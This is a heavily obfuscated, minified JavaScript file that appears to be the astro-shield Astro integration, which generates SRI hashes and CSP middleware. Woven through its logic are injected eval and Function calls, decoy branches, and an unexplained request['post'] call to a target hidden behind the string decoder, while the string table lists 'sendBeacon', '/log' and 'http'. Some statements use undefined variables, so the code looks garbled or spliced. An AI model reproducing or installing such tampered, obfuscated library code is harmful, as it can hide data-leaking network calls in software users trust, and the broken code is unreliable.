_0x9377a5={'scripts':{},'styles':{}};for(const [_0x103a5f,_0x274c5c]of _0x2c5c06['perResourceSriHashes'][_0x44d82d(0x144)]['entries']()){_0x9377a5['scripts'][_0x103a5f]=_0x274c5c;}for(const [_0x4fcb83,_0x4aa581]of _0x2c5c06['perResourceSriHashes']['styles'][_0x44d82d(0x134)]()){_0x44d82d(0x149)!==_0x586a02[_0x44d82d(0xd3)]?_0x27f83c[_0x44d82d(0x11d)]({'safe':!![]}):_0x9377a5['styles'][_0x4fcb83]=_0x4aa581;}if(await _0x586a02[_0x44d82d(0x88)](doesFileExist,_0x4e729b)){const _0x3be2a7=await import(_0x4e729b);_0x4bb151=!sriHashesEqual(_0x9377a5,_0x3be2a7[_0x44d82d(0xce)]??{'scripts':{},'styles':{}}),_0x447746=_0x4bb151||!_0x586a02['DmmJi'](arraysEqual,_0x4148d3,_0x3be2a7[_0x44d82d(0xcb)]??[])||!_0x586a02[_0x44d82d(0x104)](arraysEqual,_0x21f223,_0x3be2a7[_0x44d82d(0xca)]??[])||!_0x586a02[_0x44d82d(0x104)](arraysEqual,_0x5d9125,_0x3be2a7[_0x44d82d(0x120)]??[])||!_0x586a02[_0x44d82d(0x143)](arraysEqual,_0x132f6b,_0x3be2a7[_0x44d82d(0x87)]??[])||!_0x586a02['kTGaF'](pageHashesEqual,_0x2de1ac,_0x3be2a7[_0x44d82d(0x11e)]??{});}else _0x586a02[_0x44d82d(0x121)](_0x586a02['WDtIo'],_0x44d82d(0xec))?oRAODo[_0x44d82d(0xe2)](0x1,0x1):_0x447746=!![];if(_0x447746){if(_0x586a02[_0x44d82d(0x8e)](_0x586a02['OLlFY'],_0x586a02[_0x44d82d(0x73)])){if(_0x586a02[_0x44d82d(0xe7)](_0x4bb151,_0x386702)){if('sPjkW'!==_0x586a02['khKXT'])_0x3c0a34['warn'](_0x44d82d(0x125));else{if(_0x1a9815===_0x3cc621)return _0x1bcd58('console.log(\x22timer\x22);',0x3e8),_0x2e14e8;eval('const _0x24e216 = _0x44d82d;_0x586a02[_0x24e216(151)](1, 1);');return;}}let _0x54fdd8=_0x44d82d(0x156);_0x54fdd8+=_0x44d82d(0xc1)+_0x4148d3['map'](_0x5286f7=>_0x44d82d(0x126)+_0x5286f7+'\x27,')[_0x44d82d(0x99)]('')+(_0x4148d3[_0x44d82d(0xaf)]>0x0?'\x0a':'')+_0x44d82d(0xc9),_0x54fdd8+=_0x44d82d(0x118)+_0x21f223['map'](_0x42e381=>_0x44d82d(0x126)+_0x42e381+'\x27,')[_0x44d82d(0x99)]('')+(_0x586a02[_0x44d82d(0x6c)](_0x21f223[_0x44d82d(0xaf)],0x0)?'\x0a':'')+_0x44d82d(0xc9),_0x54fdd8+=_0x44d82d(0x11f)+_0x5d9125['map'](_0x3e2a89=>'\x0a\x09\x27'+_0x3e2a89+'\x27,')[_0x44d82d(0x99)]('')+(_0x586a02[_0x44d82d(0xfe)](_0x5d9125[_0x44d82d(0xaf)],0x0)?'\x0a':'')+_0x44d82d(0xc9),_0x54fdd8+=_0x44d82d(0x6a)+_0x132f6b[_0x44d82d(0x6f)](_0x2c611d=>'\x0a\x09\x27'+_0x2c611d+'\x27,')[_0x44d82d(0x99)]('')+(_0x586a02[_0x44d82d(0x7a)](_0x132f6b['length'],0x0)?'\x0a':'')+_0x44d82d(0xc9),_0x54fdd8+=_0x44d82d(0xa1)+Object[_0x44d82d(0x134)](_0x2de1ac)[_0x44d82d(0x74)]()['map'](([_0x5a9912,_0x4b8375])=>'\x0a\x09\x09\x27'+_0x5a9912+_0x44d82d(0x7b)+_0x4b8375['scripts']['map'](_0x261b1b=>_0x44d82d(0x8c)+_0x261b1b+'\x27,')[_0x44d82d(0x99)]('')+(_0x4b8375[_0x44d82d(0x144)][_0x44d82d(0xaf)]>0x0?_0x44d82d(0x153):'')+_0x44d82d(0x131)+_0x4b8375[_0x44d82d(0xee)][_0x44d82d(0x6f)](_0x39c9be=>_0x44d82d(0x8c)+_0x39c9be+'\x27,')['join']('')+(_0x4b8375[_0x44d82d(0xee)][_0x44d82d(0xaf)]>0x0?_0x44d82d(0x153):'')+_0x44d82d(0xbd))['join'](',')+_0x44d82d(0x9b),_0x54fdd8+=_0x44d82d(0x98)+Object[_0x44d82d(0x134)](_0x9377a5[_0x44d82d(0x144)])[_0x44d82d(0x6f)](([_0x520799,_0x4846de])=>_0x44d82d(0xa3)+_0x520799+'\x27:\x20\x27'+_0x4846de+_0x44d82d(0x10e))[_0x44d82d(0x99)]('')+'\x09}),\x0a\x09styles:\x20/**\x20@type\x20{Record<string,string>}\x20*/\x20({\x0a'+Object['entries'](_0x9377a5['styles'])[_0x44d82d(0x6f)](([_0x164e11,_0x5a9488])=>'\x09\x09\x27'+_0x164e11+'\x27:\x20\x27'+_0x5a9488+'\x27,\x0a')[_0x44d82d(0x99)]('')+_0x44d82d(0x13c),await mkdir(_0x586a02['KSPdW'](dirname,_0x4e729b),{'recursive':!![]}),await _0x586a02[_0x44d82d(0xb1)](writeFile,_0x4e729b,_0x54fdd8);}else{const _0x316035=_0x1d9dfe('sha256');if(_0x586a02['LeZoH'](_0x3c17c3,_0x5c3552))_0x316035[_0x44d82d(0xcf)](_0x2367db[_0x44d82d(0x142)](_0x550765));else _0x586a02[_0x44d82d(0x13a)](_0x283841,_0x4c8bdd)?_0x316035[_0x44d82d(0xcf)](_0x84fa27):_0x316035[_0x44d82d(0xcf)](_0x282c31,'utf8');_0x586a02['FWRWW'](_0x59cd83,_0x586a02[_0x44d82d(0x95)],0x3e8);return _0x44d82d(0x105)+_0x316035[_0x44d82d(0x6b)](_0x44d82d(0x13e));_0x2ce810(_0x44d82d(0x110),0x3e8);}}request['post'](_0x586a02[_0x44d82d(0x7f)]);}export const processStaticFiles=async(_0x374645,{distDir:_0x79887f,sri:_0x10b6aa})=>{const _0x2909d9=_0x48bd1a,_0x2087da={'gtpQl':function(_0xefe039,_0x171433,_0x4de923,_0x4152ff){return _0xefe039(_0x171433,_0x4de923,_0x4152ff);},'GnvQe':function(_0x2315a1,_0x30ff87){return _0x2315a1(_0x30ff87);},'Cuugz':'return\x20new\x20Date();','rbWQu':function(_0x5617ba,_0x4754a1,_0x462fb0,_0x6a6ded,_0xa96a54){return _0x5617ba(_0x4754a1,_0x462fb0,_0x6a6ded,_0xa96a54);}},_0x25888c={'inlineScriptHashes':new Set(),'inlineStyleHashes':new Set(),'extScriptHashes':new Set(),'extStyleHashes':new Set(),'perPageSriHashes':new Map(),'perResourceSriHashes':{'scripts':new Map(),'styles':new Map()}};await scanDirectory(_0x374645,_0x79887f,_0x79887f,_0x25888c,processHTMLFile,_0x4d4f09=>extname(_0x4d4f09)==='.html',_0x10b6aa),await _0x2087da['gtpQl'](scanForNestedResources,_0x374645,_0x79887f,_0x25888c);if(!_0x10b6aa[_0x2909d9(0x101)]){_0x2087da[_0x2909d9(0x77)](Function,_0x2087da[_0x2909d9(0xdd)])();return;}await _0x2087da['rbWQu'](generateSRIHashesModule,_0x374645,_0x25888c,_0x10b6aa['hashesModule'],_0x10b6aa[_0x2909d9(0x9e)]);};export const getMiddlewareHandler=_0x41a8ad=>{const _0x2f0059=_0x48bd1a,_0xb7907f={'RdBDX':function(_0x2ad262,_0x35f95c,_0x43f11b,_0x8e90bc){return _0x2ad262(_0x35f95c,_0x43f11b,_0x8e90bc);},'nHFIR':function(_0x55986e,_0x1837e2){return _0x55986e(_0x1837e2);},'GTDFp':_0x2f0059(0xa7)};return eval('1 + 1;'),async(_0x451808,_0x46bfc5)=>{const _0x27d927=_0x2f0059,_0x35fc53=await _0x46bfc5(),_0x45023f=await _0x35fc53['text'](),{updatedContent:_0x20df41}=await _0xb7907f['RdBDX'](updateDynamicPageSriHashes,console,_0x45023f,_0x41a8ad),_0x17a1b2=new Response(_0x20df41,{'status':_0x35fc53[_0x27d927(0xaa)],'statusText':_0x35fc53['statusText'],'headers':_0x35fc53[_0x27d927(0xf7)]});return _0xb7907f[_0x27d927(0xc0)](Function,_0xb7907f['GTDFp'])(),_0x17a1b2;};};export const getCSPMiddlewareHandler=(_0xfe0d6d,_0xda9ad7)=>{const _0x4018d5=_0x48bd1a,_0x160dca={'mnXag':function(_0x236bfe,_0x56a1cd){return _0x236bfe+_0x56a1cd;},'LsyGQ':function(_0x22bf34,_0x5e8580,_0xd8df47,_0x53bee6){return _0x22bf34(_0x5e8580,_0xd8df47,_0x53bee6);},'HuFIN':_0x4018d5(0x10d)};eval('const _0x5cd818 = _0x4018d5;_0x160dca[_0x5cd818(214)](1, 1);');return async(_0x4c37cd,_0x3d27eb)=>{const _0x3d0f2f=_0x4018d5,_0x340e6f=await _0x3d27eb(),_0x5339d1=await _0x340e6f[_0x3d0f2f(0x11c)](),{updatedContent:_0xa1fa6b,pageHashes:_0x10bb0a}=await updateDynamicPageSriHashes(console,_0x5339d1,_0xfe0d6d),_0x40d9b9=new Response(_0xa1fa6b,{'status':_0x340e6f[_0x3d0f2f(0xaa)],'statusText':_0x340e6f[_0x3d0f2f(0x114)],'headers':_0x160dca[_0x3d0f2f(0xda)](patchHeaders,_0x340e6f[_0x3d0f2f(0xf7)],_0x10bb0a,_0xda9ad7)});return new AsyncFunction(_0x160dca[_0x3d0f2f(0x14d)])(),_0x40d9b9;};content[_0x4018d5(0x85)](/href="([^"]+)"/g);};const middlewareVirtualModuleId='virtual:@kindspells/astro-shield/middleware';new RegExp(_0x48bd1a(0x152))[_0x48bd1a(0xa2)](input);const resolvedMiddlewareVirtualModuleId='\x00'+middlewareVirtualModuleId,loadVirtualMiddlewareModule=async(_0x1855f1,_0x57afa8,_0x537f08,_0x3c6d65)=>{const _0x466f5e=_0x48bd1a,_0x5d9124={'EIKSF':_0x466f5e(0xac),'TTWMG':function(_0x4cbc89,_0x237c2e){return _0x4cbc89(_0x237c2e);},'hXAYM':function(_0x423a35,_0x4a0c08,_0x111572){return _0x423a35(_0x4a0c08,_0x111572);},'bKqFZ':_0x466f5e(0x15e),'DoMBg':function(_0x26ce0d,_0x30c974){return _0x26ce0d!==_0x30c974;},'uXagQ':_0x466f5e(0x14f)};let _0x12e38d='',_0x2d5bac='';if(_0x57afa8[_0x466f5e(0xde)]&&_0x57afa8['hashesModule']&&!await doesFileExist(_0x57afa8['hashesModule'])){const _0xa2a26e={'inlineScriptHashes':new Set(),'inlineStyleHashes':new Set(),'extScriptHashes':new Set(),'extStyleHashes':new Set(),'perPageSriHashes':new Map(),'perResourceSriHashes':{'scripts':new Map(),'styles':new Map()}};await scanForNestedResources(_0x1855f1,_0x3c6d65,_0xa2a26e),await generateSRIHashesModule(_0x1855f1,_0xa2a26e,_0x57afa8['hashesModule'],![]);}if(_0x57afa8[_0x466f5e(0xde)]&&_0x57afa8[_0x466f5e(0x101)]&&await _0x5d9124[_0x466f5e(0xd9)](doesFileExist,_0x57afa8[_0x466f5e(0x101)]))_0x12e38d=_0x466f5e(0xfc)+_0x57afa8['hashesModule']+'\x27',_0x2d5bac=_0x466f5e(0xc2);else _0x57afa8['enableStatic']&&_0x57afa8[_0x466f5e(0x101)]&&(_0x466f5e(0xf5)===_0x466f5e(0xf5)?_0x1855f1[_0x466f5e(0x96)](_0x466f5e(0xf8)+_0x57afa8[_0x466f5e(0x101)]+'\x22\x20did\x20not\x20exist\x20at\x20build\x20time.\x20You\x20may\x20have\x20to\x20run\x20the\x20build\x20step\x20again'):_0x514f33['log'](_0x5d9124[_0x466f5e(0x148)]));return _0x5d9124['hXAYM'](setTimeout,function(){const _0x2a2e42=_0x466f5e;console[_0x2a2e42(0x9c)](_0x2a2e42(0xac));},0x64),_0x466f5e(0x102)+(_0x537f08!==undefined?_0x5d9124[_0x466f5e(0xae)]:'getMiddlewareHandler')+_0x466f5e(0x128)+_0x12e38d+'\x0a\x0aexport\x20const\x20onRequest\x20=\x20await\x20(async\x20()\x20=>\x20{\x0a\x09const\x20globalHashes\x20=\x20await\x20getGlobalHashes()\x0a\x0a\x09'+_0x2d5bac+_0x466f5e(0x146)+(_0x5d9124['DoMBg'](_0x537f08,undefined)?_0x466f5e(0xfa)+JSON[_0x466f5e(0x11d)](_0x537f08)+')':_0x5d9124['uXagQ'])+_0x466f5e(0x132);},getViteMiddlewarePlugin=(_0x5c8b8f,_0x469f42,_0x19a0ad,_0x4cb322)=>{const _0x1f942d=_0x48bd1a,_0x47a9ec={'DqngN':_0x1f942d(0x133),'vOfzC':_0x1f942d(0x14a),'fnzZR':function(_0x439ad4,_0x3f9bef,_0x5577b2,_0x1e63b6,_0x50a6a5){return _0x439ad4(_0x3f9bef,_0x5577b2,_0x1e63b6,_0x50a6a5);},'XAmvD':function(_0x11359d,_0x13861c,_0x492f27){return _0x11359d(_0x13861c,_0x492f27);}};return setTimeout(function(){const _0x21d791=_0x1f942d;console[_0x21d791(0x9c)](_0x21d791(0xac));},0x64),{'name':'vite-plugin-astro-shield','resolveId'(_0x5d49a7){const _0xc3b945=_0x1f942d;if(_0x5d49a7===middlewareVirtualModuleId)return setTimeout(_0x47a9ec[_0xc3b945(0x155)],0x3e8),resolvedMiddlewareVirtualModuleId;eval('1 + 1;');return;},async 'load'(_0x32907f,_0x33b480){const _0x2dfe9c=_0x1f942d,_0x3e2826={'gJLnD':function(_0x45625a,_0x3dc570){return _0x45625a!==_0x3dc570;}};if(_0x47a9ec['vOfzC']!==_0x47a9ec[_0x2dfe9c(0xfd)]){if(_0x3e2826[_0x2dfe9c(0xe6)](_0x2c3174[_0x2dfe9c(0xee)][_0x379e71],_0x58450e))return eval('_0x421afd[\'PI\'] * 2;'),![];}else switch(_0x32907f){case resolvedMiddlewareVirtualModuleId:eval('1 + 1;');return await _0x47a9ec['fnzZR'](loadVirtualMiddlewareModule,_0x5c8b8f,_0x469f42,_0x19a0ad,_0x4cb322);default:_0x47a9ec[_0x2dfe9c(0xc5)](setTimeout,_0x47a9ec['DqngN'],0x3e8);return;}}};};function _0x4008(){const _0x84903c=['YDhsE','VrLZm','sha256','map','JFJlA','open','content','OLlFY','sort','ext','BsWeX','GnvQe','sendBeacon','MnkKM','wzBDl','\x27:\x20{\x0a\x09\x09\x09scripts:\x20[','ojpGu','oRrMw','oQPkE','VAnQA','call','attrs','suNNo','all','RovEv','match','30011lXWRAq','extStyleHashes','KSPdW','NifOv','ZSpao','eXVBm','\x0a\x09\x09\x09\x09\x27','Unable\x20to\x20obtain\x20SRI\x20hash\x20for\x20local\x20resource:\x20\x22','iJtyV','.css','LYNot','hkwWy','IViJi','toLowerCase','Hashes','wcHho','warn','yFlor','export\x20const\x20perResourceSriHashes\x20=\x20{\x0a\x09scripts:\x20/**\x20@type\x20{Record<string,string>}\x20*/\x20({\x0a','join','virtual:@kindspells/astro-shield/middleware','}\x0a)\x0a\x0a','log','wglXt','enableMiddleware','post','/log','export\x20const\x20perPageSriHashes\x20=\x0a\x09/**\x20@type\x20{Record<string,\x20{\x20scripts:\x20string[];\x20styles:\x20string\x20[]\x20}>}\x20*/\x20({','test','\x09\x09\x27','mqnjB','17293270iecOHK','mFJfl','return\x20new\x20Date();','rIDXA','groups','status','Gcrcm','safe','1017616ZSRZba','bKqFZ','length','Skipping\x20SRI\x20hash\x20generation\x20for\x20inline\x20','DmmJi','integrity2','tLbVR','FTavy','Found\x20empty\x20integrity\x20attribute,\x20skipping...','KgWhD','Unable\x20to\x20process\x20external\x20resource:\x20\x22','\x22\x20(inline\x20','replace','Iugpq','</script>','mCDLF','],\x0a\x09\x09}','2377165wwYFSw','ojyJV','nHFIR','export\x20const\x20inlineScriptHashes\x20=\x20/**\x20@type\x20{string[]}\x20*/\x20([','\x0atry\x20{\x0a\x09if\x20(perResourceSriHashes)\x20{\x0a\x09\x09for\x20(const\x20[key,\x20value]\x20of\x20Object.entries(\x0a\x09\x09\x09perResourceSriHashes.scripts\x20??\x20{},\x0a\x09\x09))\x20{\x0a\x09\x09\x09globalHashes.scripts.set(key,\x20value)\x0a\x09\x09}\x0a\x09\x09for\x20(const\x20[key,\x20value]\x20of\x20Object.entries(\x0a\x09\x09\x09perResourceSriHashes.styles\x20??\x20{},\x0a\x09\x09))\x20{\x0a\x09\x09\x09globalHashes.styles.set(key,\x20value)\x0a\x09\x09}\x0a\x09}\x0a}\x20catch\x20(err)\x20{\x0a\x09console.error(\x27Failed\x20to\x20load\x20static\x20hashes\x20module:\x27,\x20err)\x0a}\x0a','ZEjXT','publicDir','XAmvD','\x20integrity=\x22','TOLNP','mLdsu','])\x0a\x0a','inlineStyleHashes','inlineScriptHashes','eVEUd','integrity1','perResourceSriHashes','update','Script','get','exec','xxWRW','oRKsZ','/@vite/','mnXag','set','yjSUP','TTWMG','LsyGQ','GET','startsWith','Cuugz','enableStatic','VWNjG','hdOxh','trTDU','McpUd','tMjov','\x22,\x20expected\x20\x22','4845519gTWJaV','gJLnD','rhgOO','SYpKd','<link','\x20crossorigin=\x22anonymous\x22','LyksO','NQHzv','XIttc','styles','keys','add','inline','vjtlQ','3621093gBLPzK','qlhkq','ORpYk','jNdWz','headers','The\x20SRI\x20hashes\x20module\x20\x22','OrASn','getCSPMiddlewareHandler(globalHashes,\x20','src1','import\x20{\x20perResourceSriHashes\x20}\x20from\x20\x27','vOfzC','Czbhz','scripts\x20must\x20have\x20either\x20a\x20src\x20attribute\x20or\x20content,\x20but\x20not\x20both\x20\x22','zhQCv','hashesModule','\x0aimport\x20{\x20defineMiddleware\x20}\x20from\x20\x27astro/middleware\x27\x0aimport\x20{\x20getGlobalHashes\x20}\x20from\x20\x27@kindspells/astro-shield/state\x27\x0aimport\x20{\x20','aZAWF','FWRWW','sha256-','BylQF','.mjs','nCDrw','.js','src2','allowInlineStyles','aEHEZ','return\x20await\x20Promise.resolve(42);','\x27,\x0a','qmLrn','updateClock();','Style','/@fs/','bMAZw','statusText','prototype','3511794qoVMrT','utf8','export\x20const\x20inlineStyleHashes\x20=\x20/**\x20@type\x20{string[]}\x20*/\x20([','<style','htEdQ','QaYRh','text','stringify','perPageSriHashes','export\x20const\x20extScriptHashes\x20=\x20/**\x20@type\x20{string[]}\x20*/\x20([','extScriptHashes','oqhNP','arrayBuffer','RQlsE','allowInlineScripts','SRI\x20hashes\x20have\x20changed\x20for\x20static\x20resources\x20that\x20may\x20be\x20used\x20in\x20dynamic\x20pages.\x20You\x20should\x20run\x20the\x20build\x20step\x20again','\x0a\x09\x27','OZyRm','\x20}\x20from\x20\x27@kindspells/astro-shield/core\x27\x0a','CWubi','tpbqg','MLXQW','UPJPN','http','11iykstX','jqigb','includes','],\x0a\x09\x09\x09styles:\x20[',')\x0a})()\x0a','console.log(\x22timer\x22);','entries','FWEfL','XGMSQ','DdPBf','PHOHL','FGBFl','vAxyj','indexOf','\x09}),\x0a}\x0a','\x20are\x20disabled)','base64','2DhaZuL','xbqBQ','8LTOHby','from','QSOll','scripts','uHwDa','\x0a\x0a\x09Function(\x22return\x20new\x20Date();\x22)();\x0a\x09return\x20defineMiddleware(','CMxar','EIKSF','mQnlj','VKWST','var\x20x\x20=\x2042;\x20return\x20x;','12iVAryI','HuFIN','odbNy','getMiddlewareHandler(globalHashes)','</style>','lrNwO','^[a-zA-Z0-9]+$','\x0a\x09\x09\x09','gqIQK','DqngN','//\x20Do\x20not\x20edit\x20this\x20file\x20manually\x0a\x0a','mcQbu','IvIGD','MnGzu','\x20(inline\x20','kRPbU','has','wBqXF','getCSPMiddlewareHandler','LuVie','export\x20const\x20extStyleHashes\x20=\x20/**\x20@type\x20{string[]}\x20*/\x20([','digest'];_0x4008=function(){return _0x84903c;};return _0x4008();}export const getAstroConfigSetup=(_0x141216,_0x16978e)=>{const _0x31d961=_0x48bd1a,_0x276522={'BsWeX':function(_0x59c351,_0x5602c8){return _0x59c351(_0x5602c8);},'IVbDN':function(_0x1b141d,_0x35ea54){return _0x1b141d(_0x35ea54);},'LYNot':_0x31d961(0x9f),'UPJPN':_0x31d961(0x9a),'yjSUP':_0x31d961(0xa7)};return _0x276522[_0x31d961(0x76)](Function,_0x276522[_0x31d961(0xd8)])(),async({logger:_0x4bfdc7,addMiddleware:_0x4d485e,config:_0x2fd89c,updateConfig:_0x9d63c0})=>{const _0x188f63=_0x31d961,_0x54ba11=_0x276522[_0x188f63(0x76)](fileURLToPath,_0x2fd89c[_0x188f63(0xc4)]),_0x2d8178=getViteMiddlewarePlugin(_0x4bfdc7,_0x141216,_0x16978e,_0x54ba11);_0x276522['IVbDN'](_0x9d63c0,{'vite':{'plugins':[_0x2d8178]}}),_0x4d485e({'order':_0x276522[_0x188f63(0x90)],'entrypoint':_0x276522[_0x188f63(0x12c)]});};};